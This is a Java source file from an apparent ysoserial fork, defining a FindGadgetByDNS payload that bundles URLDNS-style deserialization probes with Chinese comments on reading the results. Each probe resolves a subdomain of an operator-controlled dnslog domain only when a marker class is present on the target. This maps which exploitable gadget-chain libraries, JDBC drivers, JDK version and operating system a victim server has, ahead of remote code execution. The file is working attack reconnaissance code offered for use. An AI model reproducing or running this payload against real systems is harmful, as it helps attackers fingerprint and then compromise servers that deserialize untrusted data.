package ysoserial.payloads;


import com.bloom.util.Fuzz;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;

/**
 * 批量 DNS 探测：一次请求返回一组 URLDNS 变体探针，每个探针只在目标端
 * 存在对应标记类时才触发 DNS 解析，用于判断目标 classpath 上可用的利用链依赖。
 *
 * 判读规则（配合 dnslog 类平台）：
 * 1. 每次请求生成 6 位随机串 runId，探针 URL 形如 http://{marker}.{runId}.{domain}。
 *    判读时剥掉用户自己的 {domain}，剩余两段中左边是 marker，右边是 runId（同批去重用）。
 * 2. ctrlp（java.lang.Object）必须触发。未触发说明反序列化链不可达或目标 DNS 出网被拦，
 *    此时所有阴性结果都不可信。
 * 3. ctrln（必然不存在的类）必须不触发。触发说明探测环境存在误报（如通配捕获）。
 * 4. 目标端某个标记类缺失不会中断其余探针的执行（JDK 对 Class 解析失败采用延迟异常），
 *    一次请求即可拿到全部结果。
 * 5. 注意：本模块通过 javaSerializedData 投递。目标 JDK 在 8u431 / 11.0.25 / 17.0.13 /
 *    21.0.5 之后默认 com.sun.jndi.ldap.object.trustSerialData=false，整个批次失效。
 *
 * 版本判别机制：探针以 TC_CLASS 按类名在目标端解析，类存在才触发 DNS。
 * 各版本段探针靠「标记（内部）类只存在于特定版本段」区分版本，与 serialVersionUID 无关。
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
public class FindGadgetByDNS implements ObjectPayload<Object> {
    private String dnsDomain;

    /**
     * 探针表：{子域 marker, 标记类全名}。
     * 标记类尽量引用 Fuzz.Fuzzmap 保持单一来源。老 marker 保持原样便于对账。
     */
    private static final String[][] PROBES = {
            // CommonsCollections1/3/5/6/7 链，需要 <=3.2.1 版本
            {"cc31or321", "org.apache.commons.collections.functors.ChainedTransformer"},
            {"cc322", "org.apache.commons.collections.ExtendedProperties$1"},
            // CommonsCollections2/4 链，需要 4-4.0 版本
            {"cc40", "org.apache.commons.collections4.functors.ChainedTransformer"},
            {"cc41", "org.apache.commons.collections4.FluentIterable"},
            // CommonsBeanutils 版本段：标记内部类只在对应版本段存在
            {"cb17", "org.apache.commons.beanutils.MappedPropertyDescriptor$1"},
            {"cb18x", "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry"},
            {"cb19x", "org.apache.commons.beanutils.BeanIntrospectionData"},
            // c3p0 版本段：标记类只在对应版本段存在
            {"c3p092x", "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"},
            {"c3p095x", "com.mchange.v2.c3p0.test.AlwaysFailDataSource"},
            // BeanShell1 链入口类
            {"BeanShell2", "bsh.Interpreter"},
            // bsh 版本段：标记内部类只在对应版本段存在（2.0b6 无法反序列化）
            {"bsh20b4", "bsh.CollectionManager$1"},
            {"bsh20b5", "bsh.engine.BshScriptEngine"},
            {"bsh20b6", "bsh.collection.CollectionIterator$1"},
            // Groovy 版本段：标记（内部）类只在对应版本段存在
            {"groovy1702311", "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet"},
            {"groovy24x", "groovy.lang.Tuple2"},
            {"groovy244", "org.codehaus.groovy.runtime.dgm$1170"},
            // Becl，JDK<8u251
            {"becl", "com.sun.org.apache.bcel.internal.util.ClassLoader"},
            // snakeyaml
            {"snakeyaml", "org.yaml.snakeyaml.Yaml"},
            // JDK<=7u21
            {"Jdk7u21", "com.sun.corba.se.impl.orbutil.ORBClassLoader"},
            // 7u25<=JDK<=8u20，8u25 及 JDK<=7u21 会误报，结合 Jdk7u21 判读
            {"JRE8u20", "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1"},
            // 目标操作系统判别
            {"linux", "sun.awt.X11.AwtGraphicsConfigData"},
            {"windows", "sun.awt.windows.WButtonPeer"},
            // tomcatBypass（javax）
            {"el", "javax.el.ELProcessor"},
            // XStream
            {"XStream", "com.thoughtworks.xstream.XStream"},
            // mvel
            {"mvel", Fuzz.Fuzzmap.get("mvel")},
            // 反序列化链依赖组
            {"cb1", Fuzz.Fuzzmap.get("CommonsBeanutils1")},
            {"hibernate", Fuzz.Fuzzmap.get("hibernate")},
            {"json1", Fuzz.Fuzzmap.get("JSON1")},
            {"fileupload1", Fuzz.Fuzzmap.get("FileUpload1")},
            {"rome", Fuzz.Fuzzmap.get("rome")},
            {"rhino1", Fuzz.Fuzzmap.get("MozillaRhino1")},
            {"clojure", Fuzz.Fuzzmap.get("Clojure")},
            // JDBC/BeanFactory 组
            {"h2", Fuzz.Fuzzmap.get("h2Driver")},
            {"druid", Fuzz.Fuzzmap.get("druidjdbc")},
            {"tomcatjdbc", Fuzz.Fuzzmap.get("tomcatjdbc")},
            {"tdbcp1", Fuzz.Fuzzmap.get("tomcat_dbcp1_RCE")},
            {"tdbcp2", Fuzz.Fuzzmap.get("tomcat_dbcp2_RCE")},
            {"cdbcp1", Fuzz.Fuzzmap.get("commons_dbcp1_RCE")},
            {"cdbcp2", Fuzz.Fuzzmap.get("commons_dbcp2_RCE")},
            // jakarta 组（Tomcat 10 / Spring Boot 3）
            {"jel", "jakarta.el.ELProcessor"},
            // JDK 版本组：java.* 标记在生成时由工具机本地解析，
            // 工具机 JDK 没有该类时自动跳过（见 getObject 容错）
            {"jdk8", "java.time.LocalDate"},
            {"jdk9", "java.lang.Module"},
            {"jdk11p", "java.net.http.HttpClient"},
            // 对照组：正控必须触发，负控必须不触发
            {"ctrlp", "java.lang.Object"},
            {"ctrln", "com.bloom.probe.NegativeControl"},
    };

    public Object getObject(final String dnsDomain) throws Exception {
        String runId = randomRunId();
        String domain = runId + "." + dnsDomain;
        List<Object> list = new LinkedList<Object>();
        for (String[] probe : PROBES) {
            try {
                list.add(genFindClassByDNSGadget("http://" + probe[0] + "." + domain, probe[1]));
            } catch (Throwable t) {
                System.out.println("[FindGadgetByDNS] 跳过标记 " + probe[0] + ": " + t.getMessage());
            }
        }
        return list;
    }

    public FindGadgetByDNS(){}

    public FindGadgetByDNS(String dnsDomain){
        this.dnsDomain = dnsDomain;
    }

    /** 6 位随机串：首字符保证字母，整体仅含 DNS 安全字符。 */
    private static String randomRunId() {
        Random random = new Random();
        StringBuilder sb = new StringBuilder(6);
        sb.append((char) ('a' + random.nextInt(26)));
        for (int i = 1; i < 6; i++) {
            int n = random.nextInt(36);
            sb.append((char) (n < 26 ? 'a' + n : '0' + n - 26));
        }
        return sb.toString();
    }

    public static HashMap genFindClassByDNSGadget(String url, String clazzName) throws Exception{
        FindClassByDNS findGadgetByDNS = new FindClassByDNS();
        return (HashMap) findGadgetByDNS.getObject(String.format("%s|%s",url,clazzName));
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FindGadgetByDNS.class, args);
    }
}
